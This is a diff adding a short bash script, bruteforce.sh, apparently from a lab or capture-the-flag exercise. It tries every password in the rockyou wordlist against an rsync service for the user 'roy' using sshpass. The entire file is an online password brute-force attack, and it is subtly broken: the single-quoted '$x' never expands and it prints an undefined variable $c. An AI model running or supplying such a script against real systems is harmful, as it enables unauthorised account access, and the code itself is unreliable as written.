@@ -1,0 +1,9 @@
+#!/bin/bash
+#bruteforce.sh
+for x in $(cat /home/kali/tools/rockyou.txt);do
+	sshpass -p '$x' rsync -av rsync://roy@'[ip6]':8730/home_roy
+	if [[ $? -eq 0 ]]; then
+		echo $c
+		exit 
+	fi
+done
